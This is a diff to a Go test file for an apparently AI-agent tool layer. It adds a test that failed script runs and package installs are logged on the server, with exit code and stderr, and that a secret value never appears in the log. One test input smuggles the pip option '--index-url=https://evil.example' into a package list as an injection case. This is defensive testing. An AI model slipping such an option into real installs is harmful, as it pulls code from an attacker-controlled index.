@@ -1,8 +1,10 @@
 package coder
 
 import (
+	"bytes"
 	"context"
 	"fmt"
+	"log/slog"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -131,6 +133,37 @@ func TestRunInEnvSatisfiesTheBuildGate(t *testing.T) {
 	}
 	if !h.ranAuthoredScript {
 		t.Error("a run_in_env call must count as running the authored script")
+	}
+}
+
+// A failed install or script run used to reach only the model, so a run recording
+// "run_in_env ×4 (4 err)" could not be explained from the server. Both now log the
+// cause — exit code and the tail of stderr — and never a secret's value.
+func TestDepsFailuresAreLoggedOnTheServer(t *testing.T) {
+	var buf bytes.Buffer
+	prev := slog.Default()
+	slog.SetDefault(slog.New(slog.NewTextHandler(&buf, nil)))
+	defer slog.SetDefault(prev)
+
+	work := t.TempDir()
+	if err := os.WriteFile(filepath.Join(work, "s.py"), []byte("import sys\nsys.stderr.write('no complete_report.md was produced\\n')\nsys.exit(1)\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	h := &hostToolSet{includeExecTools: true, workDir: work, homesDir: t.TempDir(), workspaceID: "ws", agentName: "a",
+		subprocessEnv: map[string]string{"A_SECRET": "s3cr3t-value"},
+		deps:          skilldeps.Runner{Python: fakeVenvPython(t)}}
+
+	h.execute(context.Background(), llm.ToolCall{Name: "run_in_env", Args: []byte(`{"env":"x","script":"s.py","secrets":["A_SECRET"]}`)})
+	h.execute(context.Background(), llm.ToolCall{Name: "install_packages", Args: []byte(`{"env":"x","packages":["--index-url=https://evil.example"]}`)})
+
+	logs := buf.String()
+	for _, want := range []string{"run_in_env failed", "exit=1", "no complete_report.md was produced", "install_packages failed", "pip option"} {
+		if !strings.Contains(logs, want) {
+			t.Errorf("server log lacks %q:\n%s", want, logs)
+		}
+	}
+	if strings.Contains(logs, "s3cr3t-value") {
+		t.Error("server log leaked a secret value")
 	}
 }
 
